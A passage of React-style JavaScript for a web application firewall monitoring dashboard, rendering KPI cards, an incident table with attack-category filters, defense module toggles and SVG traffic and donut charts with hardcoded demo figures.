            className: 'btn btn-subtle',
            style: { padding: '6px 10px', fontSize: '11px', fontFamily: 'var(--font-mono)' },
            onClick: handleExportJson,
            title: 'Export Telemetry Snapshot (JSON)'
          },
            h(Icons.Download, { size: 12 }),
            h('span', { style: { marginLeft: '5px' } }, 'Export')
          )
        )
      ),

      // 2. Active Threat Wave Pulsing Banner
      isThreatWaveActive && h('div', { className: 'sg-threat-wave-banner' },
        h('div', { style: { display: 'flex', alignItems: 'center', gap: '12px' } },
          h('span', { style: { display: 'flex', alignItems: 'center', justifyContent: 'center', width: '32px', height: '32px', borderRadius: '50%', background: 'rgba(248, 81, 73, 0.3)', color: '#F85149' } },
            h(Icons.AlertTriangle, { size: 18 })
          ),
          h('div', null,
            h('div', { style: { fontSize: '13px', fontWeight: '800', color: 'var(--text-charcoal)' } },
              `⚠️ HIGH-VELOCITY ADVERSARY WAVE IN PROGRESS (${waveSecondsRemaining}s)`
            ),
            h('div', { style: { fontSize: '11px', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' } },
              '43,800 rps multi-vector blitz absorbed across edge mesh. Deterministic DFA tokenizer dropping 100% of injection probes.'
            )
          )
        ),
        h('div', { style: { display: 'flex', alignItems: 'center', gap: '8px' } },
          h('span', { className: 'badge badge-offline', style: { fontSize: '10px' } }, 'ZERO LEAKAGE'),
          h('button', {
            className: 'btn btn-subtle',
            style: { padding: '3px 8px', fontSize: '10px' },
            onClick: () => setWaveSecondsRemaining(1)
          }, 'Discharge Wave')
        )
      ),

      // 3. Workspace Sub-Navigation Bar
      h('div', { className: 'sg-subnav-bar' },
        h('button', {
          className: `sg-subnav-btn ${activeSubTab === 'overview' ? 'active' : ''}`,
          onClick: () => setActiveSubTab('overview')
        },
          h(Icons.Activity, { size: 14 }),
          '1. Executive Telemetry Overview'
        ),
        h('button', {
          className: `sg-subnav-btn ${activeSubTab === 'feed' ? 'active' : ''}`,
          onClick: () => setActiveSubTab('feed')
        },
          h(Icons.Terminal, { size: 14 }),
          `2. Live Threat Dossier & Payloads (${incidents.length})`
        ),
        h('button', {
          className: `sg-subnav-btn ${activeSubTab === 'controls' ? 'active' : ''}`,
          onClick: () => setActiveSubTab('controls')
        },
          h(Icons.Cpu, { size: 14 }),
          '3. Kernel Defense & DFA Engine'
        )
      ),

      // 4. Interactive Timeline Scrubber Panel
      h('div', { className: 'sg-glass-card sg-timeline-scrubber-card' },
        h('div', { className: 'sg-scrubber-header' },
          h('div', { className: 'sg-scrubber-title' },
            h(Icons.Sliders, { size: 14, style: { color: 'var(--deep-indigo)' } }),
            'INTERACTIVE TIMELINE SCRUBBER & HISTORICAL REPLAY'
          ),
          h('div', { className: 'sg-scrubber-controls' },
            scrubberVal < 98
              ? h('button', {
                  className: 'btn btn-subtle',
                  style: { padding: '3px 8px', fontSize: '10px', color: 'var(--deep-indigo)', fontFamily: 'var(--font-mono)' },
                  onClick: () => setScrubberVal(100)
                }, 'Jump to Live Edge ➔')
              : h('span', { className: 'badge badge-online', style: { fontSize: '9px' } }, 'LIVE STREAM EDGE')
          )
        ),
        h('div', { className: 'sg-scrubber-slider-wrap' },
          h('input', {
            type: 'range',
            className: 'sg-scrubber-input',
            min: 0,
            max: 100,
            value: scrubberVal,
            onChange: (e) => setScrubberVal(parseInt(e.target.value, 10)),
            'aria-label': 'Timeline Scrubber'
          }),
          h('div', { className: 'sg-scrubber-ticks' },
            h('span', null, `-${timeWindow}`),
            h('span', null, '-75%'),
            h('span', null, '-50%'),
            h('span', null, '-25%'),
            h('span', { style: { color: scrubberVal >= 98 ? 'var(--deep-indigo)' : 'inherit', fontWeight: '700' } },
              scrubberVal >= 98 ? 'NOW (LIVE)' : `REPLAY T-${Math.round((100 - scrubberVal) * 0.6)}m`
            )
          )
        )
      ),

      // SUB-TAB 1: EXECUTIVE TELEMETRY OVERVIEW
      activeSubTab === 'overview' && h('div', { style: { display: 'flex', flexDirection: 'column', gap: '18px' } },
        // High-Density KPI Cards (6 Grid Tiles)
        h('div', { className: 'sg-kpi-grid' },
          h('div', { className: 'sg-glass-card sg-kpi-card' },
            h('div', { className: 'sg-kpi-header' },
              h('span', { className: 'sg-kpi-kicker' }, 'Traffic Velocity'),
              h('span', { className: 'sg-kpi-badge' }, 'L7 DUAL-SERIES')
            ),
            h('div', { className: 'sg-kpi-value-wrap' },
              h('span', { className: 'sg-kpi-num' }, animatedReqs.toLocaleString()),
              h('span', { className: 'sg-kpi-unit' }, 'req/s')
            ),
            h('div', { className: 'sg-kpi-footer' },
              h('span', { className: 'sg-kpi-delta sg-delta-up-good' }, '+14.8% vs 1h'),
              h(Sparkline, { data: sparklineReqs, color: '#38BDF8', fill: '#38BDF8' })
            )
          ),

          h('div', { className: 'sg-glass-card sg-kpi-card' },
            h('div', { className: 'sg-kpi-header' },
              h('span', { className: 'sg-kpi-kicker' }, 'Threats Neutralized'),
              h('span', { className: 'sg-kpi-badge' }, 'AST DROP')
            ),
            h('div', { className: 'sg-kpi-value-wrap' },
              h('span', { className: 'sg-kpi-num', style: { color: 'var(--terracotta)' } }, animatedThreats.toLocaleString()),
              h('span', { className: 'sg-kpi-unit' }, 'blocks/s')
            ),
            h('div', { className: 'sg-kpi-footer' },
              h('span', { className: 'sg-kpi-delta sg-delta-up-bad' }, '+8.4% adversary'),
              h(Sparkline, { data: sparklineThreats, color: '#F85149', fill: '#F85149' })
            )
          ),

          h('div', { className: 'sg-glass-card sg-kpi-card' },
            h('div', { className: 'sg-kpi-header' },
              h('span', { className: 'sg-kpi-kicker' }, 'Mitigation Efficiency'),
              h('span', { className: 'sg-kpi-badge' }, 'DETERMINISTIC')
            ),
            h('div', { className: 'sg-kpi-value-wrap' },
              h('span', { className: 'sg-kpi-num', style: { color: 'var(--sage-green)' } }, '99.98%'),
              h('span', { className: 'sg-kpi-unit' }, 'origin SLA')
            ),
            h('div', { className: 'sg-kpi-footer' },
              h('span', { className: 'sg-kpi-delta sg-delta-up-good' }, '+0.04% precision'),
              h('span', { style: { fontSize: '10px', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' } }, '0 Bypass Drift')
            )
          ),

          h('div', { className: 'sg-glass-card sg-kpi-card' },
            h('div', { className: 'sg-kpi-header' },
              h('span', { className: 'sg-kpi-kicker' }, 'P99 Edge Latency'),
              h('span', { className: 'sg-kpi-badge' }, 'SUB-5MS')
            ),
            h('div', { className: 'sg-kpi-value-wrap' },
              h('span', { className: 'sg-kpi-num' }, currentMetric.p99),
              h('span', { className: 'sg-kpi-unit' }, 'ms')
            ),
            h('div', { className: 'sg-kpi-footer' },
              h('span', { className: 'sg-kpi-delta sg-delta-up-good' }, '-0.24 ms faster'),
              h('span', { style: { fontSize: '10px', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' } }, 'P50: 0.41ms')
            )
          ),

          h('div', { className: 'sg-glass-card sg-kpi-card' },
            h('div', { className: 'sg-kpi-header' },
              h('span', { className: 'sg-kpi-kicker' }, 'Quarantined Actors'),
              h('span', { className: 'sg-kpi-badge' }, 'BPF TABLE')
            ),
            h('div', { className: 'sg-kpi-value-wrap' },
              h('span', { className: 'sg-kpi-num', style: { color: 'var(--warm-ochre)' } }, '48'),
              h('span', { className: 'sg-kpi-unit' }, 'IPs isolated')
            ),
            h('div', { className: 'sg-kpi-footer' },
              h('span', { className: 'sg-kpi-delta sg-delta-neutral' }, '+12 re-attempts'),
              h('span', { style: { fontSize: '10px', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' } }, '312 Wire Drops')
            )
          ),

          h('div', { className: 'sg-glass-card sg-kpi-card' },
            h('div', { className: 'sg-kpi-header' },
              h('span', { className: 'sg-kpi-kicker' }, 'Lexical AST Engine'),
              h('span', { className: 'sg-kpi-badge' }, 'ZERO-COPY')
            ),
            h('div', { className: 'sg-kpi-value-wrap' },
              h('span', { className: 'sg-kpi-num' }, '0.19'),
              h('span', { className: 'sg-kpi-unit' }, 'ms inspect')
            ),
            h('div', { className: 'sg-kpi-footer' },
              h('span', { className: 'sg-kpi-delta sg-delta-up-good' }, 'DFA: 0.31ms'),
              h('span', { style: { fontSize: '10px', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' } }, 'Seal: 0.20ms')
            )
          )
        ),

        // Dual-Series Velocity Chart & OWASP Attack Vector Donut (Row 1)
        h('div', { className: 'sg-charts-row' },
          h('div', { className: 'sg-glass-card sg-chart-card' },
            h('div', { className: 'sg-chart-header' },
              h('h3', { className: 'sg-chart-title' },
                h(Icons.Activity, { size: 15, style: { color: 'var(--deep-indigo)' } }),
                'Real-Time Traffic Velocity & Intercept Dual-Series'
              ),
              h('div', { className: 'sg-chart-legend' },
                h('div', { className: 'sg-legend-item' },
                  h('span', { className: 'sg-legend-dot', style: { background: '#38BDF8' } }),
                  h('span', null, 'Total Ingress (req/s)')
                ),
                h('div', { className: 'sg-legend-item' },
                  h('span', { className: 'sg-legend-dot', style: { background: '#F85149' } }),
                  h('span', null, 'Intercepted Threats')
                )
              )
            ),

            h(TrafficVelocitySvg, {
              data: telemetry,
              hoveredPoint: hoveredPoint,
              onHover: setHoveredPoint
            })
          ),

          h('div', { className: 'sg-glass-card sg-chart-card' },
            h('div', { className: 'sg-chart-header' },
              h('h3', { className: 'sg-chart-title' },
                h(Icons.Shield, { size: 15, style: { color: 'var(--terracotta)' } }),
                'OWASP Attack Vector Distribution'
              )
            ),
            h('div', { className: 'sg-donut-wrap' },
              h(OwaspDonutSvg, {
                vectors: attackVectors,
                hoveredSlice: hoveredSlice,
                onHoverSlice: setHoveredSlice,
                onSelectCategory: (cat) => {
                  setCategoryFilter(categoryFilter === cat ? 'ALL' : cat);
                  setActiveSubTab('feed');
                }
              }),
              h('div', { className: 'sg-donut-legend-grid' },
                attackVectors.map((vec) =>
                  h('div', {
                    key: vec.category,
                    className: `sg-donut-legend-chip ${categoryFilter === vec.category ? 'active' : ''}`,
                    onClick: () => {
                      setCategoryFilter(categoryFilter === vec.category ? 'ALL' : vec.category);
                      setActiveSubTab('feed');
                    },
                    title: `Click to inspect ${vec.name} incidents`
                  },
                    h('div', { style: { display: 'flex', alignItems: 'center', gap: '6px' } },
                      h('span', { className: 'sg-legend-dot', style: { background: vec.color } }),
                      h('span', { style: { fontSize: '10px', fontWeight: '700', fontFamily: 'var(--font-mono)' } }, vec.category)
                    ),
                    h('span', { style: { fontSize: '10px', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' } }, `${vec.percent}%`)
                  )
                )
              )
            )
          )
        ),

        // P99 Latency Gauge & Multi-Percentile Matrix (Row 2)
        h('div', { className: 'sg-latency-grid' },
          h('div', { className: 'sg-glass-card sg-gauge-card' },
            h('div', { style: { width: '100%', display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' } },
              h('h3', { className: 'sg-chart-title' },
                h(Icons.Clock, { size: 15, style: { color: 'var(--deep-indigo)' } }),
                'P99 Tail Latency Gauge'
              ),
              h('span', { className: 'badge badge-online', style: { fontSize: '8px' } }, 'SLA: <5.0ms')
            ),
            h(RadialLatencyGauge, { value: currentMetric.p99 }),
            h('div', { style: { marginTop: '8px', fontSize: '10px', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' } },
              'Zero-Bypass Target: 100% of requests analyzed under 5.0ms'
            )
          ),

          h('div', { className: 'sg-glass-card sg-percentiles-card' },
            h('div', { style: { display: 'flex', justifyContent: 'space-between', alignItems: 'center' } },
              h('h3', { className: 'sg-chart-title' },
                h(Icons.Sliders, { size: 15, style: { color: 'var(--deep-indigo)' } }),
                'Execution Latency Spectrum & Pipeline Timing'
              ),
              h('span', { style: { fontSize: '11px', color: 'var(--sage-green)', fontFamily: 'var(--font-mono)', fontWeight: '700' } },
                '✓ Deterministic SLA Met'
              )
            ),

            h('div', { className: 'sg-percentiles-matrix' },
              h('div', { className: 'sg-percentile-box' },
                h('div', { className: 'sg-percentile-kicker' }, 'P50 MEDIAN'),
                h('div', { className: 'sg-percentile-val' }, '0.41 ms')
              ),
              h('div', { className: 'sg-percentile-box' },
                h('div', { className: 'sg-percentile-kicker' }, 'P90 DECILE'),
                h('div', { className: 'sg-percentile-val' }, '0.88 ms')
              ),
              h('div', { className: 'sg-percentile-box' },
                h('div', { className: 'sg-percentile-kicker' }, 'P95 PEAK'),
                h('div', { className: 'sg-percentile-val' }, '1.12 ms')
              ),
              h('div', { className: 'sg-percentile-box' },
                h('div', { className: 'sg-percentile-kicker', style: { color: 'var(--deep-indigo)' } }, 'P99 TAIL'),
                h('div', { className: 'sg-percentile-val', style: { color: 'var(--deep-indigo)' } }, `${currentMetric.p99} ms`)
              )
            ),

            h('div', { className: 'sg-pipeline-timing-bar' },
              h('div', { style: { display: 'flex', justifyContent: 'space-between', fontSize: '10px', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } },
                h('span', null, 'KERNEL PIPELINE BREAKDOWN (TOTAL: 0.78ms)'),
                h('span', null, '100% In-Process Zero-Copy')
              ),
              h('div', { className: 'sg-pipeline-segments' },
                h('div', { className: 'sg-pipeline-seg', style: { width: '24%', background: '#38BDF8' }, title: 'Wire Parsing: 0.19ms' }),
                h('div', { className: 'sg-pipeline-seg', style: { width: '40%', background: '#F59E0B' }, title: 'AST Lexical Tokenizer: 0.31ms' }),
                h('div', { className: 'sg-pipeline-seg', style: { width: '26%', background: '#A855F7' }, title: 'Ed25519 Cryptographic Origin Seal: 0.20ms' }),
                h('div', { className: 'sg-pipeline-seg', style: { width: '10%', background: '#3FB950' }, title: 'BPF Rule Forwarding: 0.08ms' })
              ),
              h('div', { style: { display: 'flex', justifyContent: 'space-between', fontSize: '9px', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } },
                h('span', { style: { color: '#38BDF8' } }, '■ Wire 0.19ms'),
                h('span', { style: { color: '#F59E0B' } }, '■ AST DFA 0.31ms'),
                h('span', { style: { color: '#A855F7' } }, '■ Ed25519 Seal 0.20ms'),
                h('span', { style: { color: '#3FB950' } }, '■ BPF Table 0.08ms')
              )
            )
          )
        )
      ),

      // SUB-TAB 2: LIVE THREAT FEED & FORENSICS
      activeSubTab === 'feed' && h('div', { className: 'sg-glass-card sg-incident-feed-card' },
        h('div', { className: 'sg-feed-toolbar' },
          h('div', { style: { display: 'flex', alignItems: 'center', gap: '8px' } },
            h('h3', { className: 'sg-chart-title' },
              h(Icons.AlertTriangle, { size: 15, style: { color: 'var(--terracotta)' } }),
              'Adversarial Threat Intercept Dossier'
            ),
            h('span', { className: 'badge', style: { fontSize: '9px', background: 'var(--sand-warm)' } },
              `Showing ${filteredIncidents.length} of ${incidents.length}`
            )
          ),

          h('div', { className: 'sg-feed-filters' },
            h('input', {
              type: 'text',
              className: 'sg-feed-search',
              placeholder: 'Search IP, route, rule, payload...',
              value: searchQuery,
              onChange: (e) => setSearchQuery(e.target.value)
            }),

            ['ALL', 'SQLi', 'XSS', 'RCE', 'SSRF', 'Auth', 'Bots'].map((cat) =>
              h('button', {
                key: cat,
                className: `sg-filter-pill ${categoryFilter === cat ? 'active' : ''}`,
                onClick: () => setCategoryFilter(cat)
              }, cat)
            ),

            ['ALL', 'CRITICAL', 'HIGH', 'MEDIUM'].map((sev) =>
              h('button', {
                key: sev,
                className: `sg-filter-pill ${severityFilter === sev ? 'active' : ''}`,
                onClick: () => setSeverityFilter(sev)
              }, sev)
            )
          )
        ),

        // Incident Table
        h('div', { className: 'sg-table-container' },
          h('table', { className: 'sg-incident-table' },
            h('thead', null,
              h('tr', null,
                h('th', null, 'Timestamp'),
                h('th', null, 'Severity'),
                h('th', null, 'Category'),
                h('th', null, 'Triggered Rule'),
                h('th', null, 'Target Route'),
                h('th', null, 'Client IP & Geo'),
                h('th', null, 'Intercepted Payload Preview'),
                h('th', { style: { textAlign: 'right' } }, 'Actions')
              )
            ),
            h('tbody', null,
              filteredIncidents.length === 0
                ? h('tr', null,
                    h('td', { colSpan: 8, style: { textAlign: 'center', padding: '24px', color: 'var(--text-muted)' } },
                      'No threat incidents matching active filter criteria.'
                    )
                  )
                : filteredIncidents.map((inc) =>
                    h('tr', { key: inc.id },
                      h('td', { style: { fontFamily: 'var(--font-mono)' } }, inc.timestamp),
                      h('td', null,
                        h('span', {
                          className: `badge ${inc.severity === 'CRITICAL' ? 'badge-offline' : (inc.severity === 'HIGH' ? 'badge-challenging' : 'badge-online')}`,
                          style: { fontSize: '9px' }
                        }, inc.severity)
                      ),
                      h('td', { style: { fontFamily: 'var(--font-mono)', fontWeight: '700' } }, inc.category),
                      h('td', { style: { fontFamily: 'var(--font-mono)', fontSize: '10px', color: 'var(--text-muted)' } }, inc.rule),
                      h('td', null,
                        h('code', { style: { fontSize: '10.5px' } }, inc.route)
                      ),
                      h('td', null,
                        h('div', { style: { fontFamily: 'var(--font-mono)', fontSize: '10.5px' } }, inc.clientIp),
                        h('div', { style: { fontSize: '9px', color: 'var(--text-muted)' } }, inc.geo)
                      ),
                      h('td', null,
                        h('span', { className: 'sg-payload-cell', title: inc.payload }, inc.payload)
                      ),
                      h('td', { style: { textAlign: 'right', whiteSpace: 'nowrap' } },
                        h('button', {
                          className: `sg-copy-btn ${copiedId === inc.id ? 'copied' : ''}`,
                          onClick: () => handleCopyPayload(inc.id, inc.payload),
                          title: 'Copy Raw Attack Payload to Clipboard'
                        },
                          copiedId === inc.id ? h(Icons.Check, { size: 12 }) : h(Icons.Copy, { size: 12 }),
                          copiedId === inc.id ? 'COPIED ✓' : 'Copy'
                        ),
                        h('button', {
                          className: 'btn btn-subtle',
                          style: { padding: '4px 8px', fontSize: '10px', marginLeft: '6px', fontFamily: 'var(--font-mono)' },
                          onClick: () => setSelectedIncident(inc),
                          title: 'Open Detailed Forensic Incident Dossier'
                        }, 'Inspect')
                      )
                    )
                  )
            )
          )
        )
      ),

      // SUB-TAB 3: KERNEL DEFENSE CONTROLS & DFA ENGINE
      activeSubTab === 'controls' && h('div', { style: { display: 'flex', flexDirection: 'column', gap: '18px' } },
        // Autonomous Defense Modules Matrix
        h('div', { className: 'sg-glass-card', style: { padding: '18px 20px' } },
          h('div', { style: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '14px' } },
            h('h3', { className: 'sg-chart-title' },
              h(Icons.Cpu, { size: 15, style: { color: 'var(--deep-indigo)' } }),
              'Autonomous In-Process WAAP Defense Matrix'
            ),
            h('span', { className: 'badge badge-online', style: { fontSize: '9px' } }, 'KERNEL ACTIVE')
          ),

          h('div', { className: 'sg-defense-grid' },
            [
              { key: 'astEngine', name: 'AST Lexical Tokenizer', desc: 'Deterministic SQL/XSS parsing with zero regex backtracking' },
              { key: 'ebpfWireDrop', name: 'eBPF Wire Kernel Drop', desc: 'L3/L4 drop of quarantined offender IPs before userland allocation' },
              { key: 'ja4Fingerprint', name: 'JA4 Client TLS Fingerprint', desc: 'Behavioral detection of headless bot scrapers and automated probing tools' },
              { key: 'ed25519OriginSeal', name: 'RFC 8032 Origin Seal', desc: 'Cryptographic signature on every verified clean HTTP request' },
              { key: 'adaptiveRateLimiter', name: 'Adaptive Token Bucket', desc: 'Dynamic per-IP rate limiting based on adversarial risk scoring' }
            ].map((mod) =>
              h('div', { key: mod.key, className: 'sg-defense-card sg-glass-panel' },
                h('div', { className: 'sg-defense-header' },
                  h('div', null,
                    h('div', { style: { fontSize: '12px', fontWeight: '800', color: 'var(--text-charcoal)' } }, mod.name),
                    h('div', { style: { fontSize: '10px', color: 'var(--text-muted)', marginTop: '2px' } }, mod.desc)
                  ),
                  h('label', { className: 'sg-switch' },
                    h('input', {
                      type: 'checkbox',
                      checked: defenseToggles[mod.key],
                      onChange: () => toggleDefenseModule(mod.key)
                    }),
                    h('span', { className: 'sg-switch-slider' })
                  )
                ),
                h('div', { style: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: '9px', fontFamily: 'var(--font-mono)' } },
                  h('span', { style: { color: defenseToggles[mod.key] ? 'var(--sage-green)' : 'var(--terracotta)', fontWeight: '700' } },
                    defenseToggles[mod.key] ? 'ACTIVE (ENFORCING)' : 'DISABLED (BYPASS)'
                  ),
                  h('span', { style: { color: 'var(--text-muted)' } }, '0.0ms overhead')
                )
              )
            )
          )
        ),

        // DFA State Machine Visualizer
        h('div', { className: 'sg-glass-card', style: { padding: '18px 20px' } },
          h('div', { style: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '10px' } },
            h('h3', { className: 'sg-chart-title' },
              h(Icons.Terminal, { size: 15, style: { color: 'var(--warm-ochre)' } }),
              'DFA Regular Grammar State Machine Pipeline (Zero-Backtracking AST)'
            ),
            h('span', { className: 'badge badge-online', style: { fontSize: '9px' } }, 'LIVE STREAM')
          ),
          h('p', { style: { fontSize: '11px', color: 'var(--text-muted)', margin: '0 0 14px 0' } },
            'Visualizes in-process token transition as malicious payloads pass through the zero-copy compiler pipeline:'
          ),
          h('div', { className: 'sg-dfa-pipeline-wrap' },
            [
              { step: 0, label: 'S0_INGRESS', desc: 'Raw Wire Buffer' },
              { step: 1, label: 'S1_LEX_SCAN', desc: 'Quote Delimiter' },
              { step: 2, label: 'S2_KEYWORD', desc: 'UNION / SELECT' },
              { step: 3, label: 'S3_TREE_EVAL', desc: 'SQL Subtree Gen' },
              { step: 4, label: 'S4_TRIP_DROP', desc: 'Deterministic 403' }
            ].map((s, idx) =>
              h(React.Fragment, { key: s.step },
                h('div', { className: `sg-dfa-step ${dfaActiveStep === s.step ? 'active' : ''}` },
                  h('span', { style: { fontSize: '9px', fontFamily: 'var(--font-mono)', color: 'var(--deep-indigo)', fontWeight: '800' } }, `STATE ${s.step}`),
                  h('span', { style: { fontSize: '11px', fontWeight: '800', fontFamily: 'var(--font-mono)' } }, s.label),
                  h('span', { style: { fontSize: '9px', color: 'var(--text-muted)' } }, s.desc)
                ),
                idx < 4 && h('span', { className: 'sg-dfa-arrow' }, '➔')
              )
            )
          )
        ),

        // Global Edge Nodes Telemetry Mesh
        h('div', { className: 'sg-glass-card', style: { padding: '18px 20px' } },
          h('div', { style: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '12px' } },
            h('h3', { className: 'sg-chart-title' },
              h(Icons.Globe, { size: 15, style: { color: 'var(--sage-green)' } }),
              'Edge Node Telemetry & Distributed Origin Mesh'
            ),
            h('span', { className: 'badge badge-online', style: { fontSize: '9px' } }, '4 REGIONS SYNCED')
          ),
          h('div', { className: 'sg-edge-nodes-grid' },
            edgeNodes.map((node) =>
              h('div', { key: node.region, className: 'sg-edge-node-card' },
                h('div', { style: { fontSize: '11px', fontWeight: '800', color: 'var(--text-charcoal)' } }, node.region),
                h('div', { style: { display: 'flex', justifyContent: 'space-between', fontSize: '10px', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } },
                  h('span', null, 'Round-trip Latency:'),
                  h('span', { style: { color: 'var(--sage-green)', fontWeight: '700' } }, node.ping)
                ),
                h('div', { style: { display: 'flex', justifyContent: 'space-between', fontSize: '10px', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } },
                  h('span', null, 'Live Throughput:'),
                  h('span', { style: { color: 'var(--deep-indigo)' } }, node.traffic)
                ),
                h('div', { style: { display: 'flex', justifyContent: 'space-between', fontSize: '10px', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } },
                  h('span', null, 'Drop Precision:'),
                  h('span', { style: { color: 'var(--sage-green)' } }, node.dropRate)
                )
              )
            )
          )
        )
      ),

      // 5. Forensic Payload Modal Overlay
      selectedIncident && h(ForensicPayloadModal, {
        incident: selectedIncident,
        onClose: () => setSelectedIncident(null),
        onCopy: handleCopyPayload,
        isCopied: copiedId === selectedIncident.id
      })
    );
  }

  // ===========================================================================
  // 8. SUB-COMPONENT: TRAFFIC VELOCITY DUAL-SERIES SVG CHART
  // ===========================================================================
  function TrafficVelocitySvg({ data, hoveredPoint, onHover }) {
    if (!data || data.length < 2) return null;

    const svgWidth = 800;
    const svgHeight = 230;
    const padding = { top: 20, right: 30, bottom: 30, left: 55 };

    const chartW = svgWidth - padding.left - padding.right;
    const chartH = svgHeight - padding.top - padding.bottom;

    const maxReq = Math.max(...data.map(d => d.requests), 20000) * 1.15;
    const maxThreat = Math.max(...data.map(d => d.threats), 3000) * 1.3;

    const reqPoints = data.map((d, i) => {
      const x = padding.left + (i / (data.length - 1)) * chartW;
      const y = padding.top + chartH - (d.requests / maxReq) * chartH;
      return { x, y, data: d };
    });

    const threatPoints = data.map((d, i) => {
      const x = padding.left + (i / (data.length - 1)) * chartW;
      const y = padding.top + chartH - (d.threats / maxThreat) * chartH;
      return { x, y, data: d };
    });

    function makeBezierPath(points) {
      if (points.length < 2) return '';
      let path = `M ${points[0].x},${points[0].y}`;
      for (let i = 0; i < points.length - 1; i++) {
        const p0 = points[i];
        const p1 = points[i + 1];
        const cx = (p0.x + p1.x) / 2;
        path += ` C ${cx},${p0.y} ${cx},${p1.y} ${p1.x},${p1.y}`;
      }
      return path;
    }

    const reqPath = makeBezierPath(reqPoints);
    const reqArea = `${reqPath} L ${padding.left + chartW},${padding.top + chartH} L ${padding.left},${padding.top + chartH} Z`;

    const threatPath = makeBezierPath(threatPoints);
    const threatArea = `${threatPath} L ${padding.left + chartW},${padding.top + chartH} L ${padding.left},${padding.top + chartH} Z`;

    const yGridTicks = [0, 0.25, 0.5, 0.75, 1.0];

    return h('div', { className: 'sg-velocity-chart-wrap' },
      h('svg', {
        className: 'sg-velocity-svg',
        viewBox: `0 0 ${svgWidth} ${svgHeight}`,
        preserveAspectRatio: 'none',
        onMouseMove: (e) => {
          const rect = e.currentTarget.getBoundingClientRect();
          const mouseX = e.clientX - rect.left;
          const relativeX = (mouseX / rect.width) * svgWidth;
          if (relativeX < padding.left || relativeX > padding.left + chartW) return;
          const idx = Math.round(((relativeX - padding.left) / chartW) * (data.length - 1));
          if (data[idx]) {
            onHover({
              x: reqPoints[idx].x,
              reqY: reqPoints[idx].y,
              threatY: threatPoints[idx].y,
              point: data[idx]
            });
          }
        },
        onMouseLeave: () => onHover(null)
      },
        h('defs', null,
          h('linearGradient', { id: 'reqGrad', x1: '0', y1: '0', x2: '0', y2: '1' },
            h('stop', { offset: '0%', stopColor: '#38BDF8', stopOpacity: 0.35 }),
            h('stop', { offset: '100%', stopColor: '#38BDF8', stopOpacity: 0.02 })
          ),
          h('linearGradient', { id: 'threatGrad', x1: '0', y1: '0', x2: '0', y2: '1' },
            h('stop', { offset: '0%', stopColor: '#F85149', stopOpacity: 0.4 }),
            h('stop', { offset: '100%', stopColor: '#F85149', stopOpacity: 0.02 })
          )
        ),

        // Y Gridlines
        yGridTicks.map((tick, i) => {
          const y = padding.top + chartH - tick * chartH;
          const valLabel = Math.round((tick * maxReq) / 1000) + 'k';
          return h('g', { key: i },
            h('line', {
              x1: padding.left,
              y1: y,
              x2: padding.left + chartW,
              y2: y,
              stroke: 'rgba(255, 255, 255, 0.06)',
              strokeDasharray: '4,4'
            }),
            h('text', {
              x: padding.left - 10,
              y: y + 4,
              fill: 'var(--text-muted)',
              fontSize: '10',
              fontFamily: 'var(--font-mono)',
              textAnchor: 'end'
            }, valLabel)
          );
        }),

        // X Axis Ticks
        [0, Math.floor(data.length / 4), Math.floor(data.length / 2), Math.floor((data.length * 3) / 4), data.length - 1].map((idx) => {
          const pt = reqPoints[idx];
          if (!pt) return null;
          return h('text', {
            key: idx,
            x: pt.x,
            y: svgHeight - 8,
            fill: 'var(--text-muted)',
            fontSize: '10',
            fontFamily: 'var(--font-mono)',
            textAnchor: 'middle'
          }, pt.data.time);
        }),

        // Area Fills
        h('path', { d: reqArea, fill: 'url(#reqGrad)' }),
        h('path', { d: threatArea, fill: 'url(#threatGrad)' }),

        // Stroke Lines
        h('path', { d: reqPath, fill: 'none', stroke: '#38BDF8', strokeWidth: '2.5', strokeLinecap: 'round' }),
        h('path', { d: threatPath, fill: 'none', stroke: '#F85149', strokeWidth: '2', strokeLinecap: 'round' }),

        // Interactive Crosshair Guide Line & Dots
        hoveredPoint && h('g', null,
          h('line', {
            x1: hoveredPoint.x,
            y1: padding.top,
            x2: hoveredPoint.x,
            y2: padding.top + chartH,
            stroke: 'var(--deep-indigo)',
            strokeWidth: '1.5',
            strokeDasharray: '3,3'
          }),
          h('circle', {
            cx: hoveredPoint.x,
            cy: hoveredPoint.reqY,
            r: '5',
            fill: '#38BDF8',
            stroke: '#FFFFFF',
            strokeWidth: '2'
          }),
          h('circle', {
            cx: hoveredPoint.x,
            cy: hoveredPoint.threatY,
            r: '5',
            fill: '#F85149',
            stroke: '#FFFFFF',
            strokeWidth: '2'
          })
        )
      ),

      // Floating HUD Tooltip Card
      hoveredPoint && h('div', {
        className: 'sg-chart-hud-tooltip',
        style: {
          left: `${(hoveredPoint.x / svgWidth) * 100}%`,
          top: `${(hoveredPoint.reqY / svgHeight) * 100}%`
        }
      },
        h('div', { style: { fontWeight: '800', color: 'var(--text-charcoal)', marginBottom: '3px' } },
          `SNAPSHOT: ${hoveredPoint.point.time}`
        ),
        h('div', { style: { color: '#38BDF8' } },
          `Ingress: ${hoveredPoint.point.requests.toLocaleString()} req/s`
        ),
        h('div', { style: { color: '#F85149' } },
          `Threats: ${hoveredPoint.point.threats.toLocaleString()} blocks/s`
        ),
        h('div', { style: { color: 'var(--sage-green)', marginTop: '2px' } },
          `P99 Latency: ${hoveredPoint.point.p99} ms`
        )
      )
    );
  }

  // ===========================================================================
  // 9. SUB-COMPONENT: OWASP ATTACK VECTOR DONUT SVG
  // ===========================================================================
  function OwaspDonutSvg({ vectors, hoveredSlice, onHoverSlice, onSelectCategory }) {
    const size = 170;
    const center = size / 2;
    const radius = 62;
    const strokeWidth = 20;

    let cumulativePercent = 0;
    const totalCount = vectors.reduce((acc, v) => acc + v.count, 0);

